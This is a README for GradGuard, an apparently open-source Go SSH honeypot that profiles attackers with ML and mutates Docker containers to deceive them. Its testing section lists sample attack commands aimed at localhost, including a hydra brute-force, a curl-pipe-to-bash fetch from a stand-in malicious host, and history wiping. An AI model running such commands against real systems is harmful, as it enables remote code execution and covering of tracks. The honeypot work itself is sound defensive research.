# GradGuard: ML-Powered Adaptive SSH Honeypot

![Go Version](https://img.shields.io/badge/Go-1.21+-00ADD8?style=flat&logo=go)
![Docker](https://img.shields.io/badge/Docker-Required-2496ED?style=flat&logo=docker)
![Status](https://img.shields.io/badge/Status-Active_Development-success)
![License](https://img.shields.io/badge/License-MIT-blue)

GradGuard is a next-generation, pure-Go SSH honeypot that actively profiles attackers using in-memory Machine Learning and dynamically alters its own environment to deceive them.

## The Problem
Standard honeypots revolutionized threat intelligence, but today's attackers are smart. Modern botnets and human adversaries run automated fingerprinting scripts the second they log in. They check `/proc/1/cgroup` for Docker hashes, probe `lsblk` for fake filesystems, and measure CPU resources. **If they detect a honeypot, they drop the connection instantly, depriving security teams of valuable payload data.**

## The Solution (Why GradGuard?)
GradGuard flips the script. Instead of presenting a static fake filesystem, GradGuard spawns a live, isolated, ephemeral Docker container for every single SSH connection. 

As the attacker types, GradGuard's custom ML engine scores their behavior in real-time. If it detects reconnaissance or fingerprinting, **GradGuard dynamically mutates the container environment**—faking bare-metal CPU stats, rewriting `.dockerenv`, and injecting honeytokens—to keep the attacker engaged and confident they have breached a real production server.

### Key Features
* **Pure Go Architecture:** No Python dependencies; fast, concurrent, and deployed as a single binary.
* **In-Memory Machine Learning:** Uses Logistic Regression, Naive Bayes, and Anomaly Detection to classify intent (Brute Force, Recon, Fingerprinting, Exploit).
* **Dynamic Deception Engine:** Actively patches the environment (e.g., masking `/proc/cpuinfo`) based on real-time suspicion scores.
* **Forensic Dashboard CLI:** Built-in analysis tool with IP geolocation, command timelines, and ML evaluation matrices.
* **Self-Improving Feedback Loop:** Every attacker session is ingested back into the training dataset.

---

## Datasets & Machine Learning
To ensure enterprise-grade accuracy, GradGuard's ML models are pre-trained on over **170MB of real-world threat data**, unified via a custom extraction pipeline:
1. **[Cowrie JSON Logs](https://www.kaggle.com/datasets/nlaha11/global-ssh-and-telnet-honeypot-logs-cowrie):** Used to train the Naive Bayes classifier on actual shell command intent and behavioral sequences.
2. **[CIC-IDS-2017](https://www.unb.ca/cic/datasets/ids-2017.html) & [CIC-IDS-2018](https://www.unb.ca/cic/datasets/ids-2018.html):** Used to train the Logistic Classifier on network flow timing (distinguishing automated SSH-Patator bots from human typing).
3. **[NSL-KDD](https://www.kaggle.com/datasets/hassan06/nslkdd):** Provides the legacy "normal" baseline for the Euclidean distance-based Anomaly Detector.

---

## Installation & Building

### Dependencies
* **Go 1.21+**
* **Docker**

### 1. Clone & Setup
```bash
git clone https://github.com/s-uryansh/GradGuard.git
cd GradGuard
```

### 2. Build
Build docker:

```bash
docker build -t honeypot-base -f Dockerfile.base .
```

Build engine:
```bash
go build -o gradguard cmd/honeypot/main.go
```

### 3. Usage & Commands

Run the server
```bash
sudo ./gradguard
```

To run the analyzer
```bash
./gradguard analyze
```

To Run analyzer of specific session:
```bash
./gradguard analyze --session <SESSION_ID>
```

#### 3.1 Testing & Attacking

* **nmap** discovery: ```nmap -sV -p 2222 127.0.0.1```
* Automated **brute-force** attack: ```hydra -l root -p password ssh://127.0.0.1:2222 -t 4```
* Manual attack testing:
    ```bash
    ssh -p 2222 root@127.0.0.1
    # Try running:
    # cat /proc/1/cgroup
    # curl [http://malicious.com/payload.sh](http://malicious.com/payload.sh) | bash
    # history -c
    ```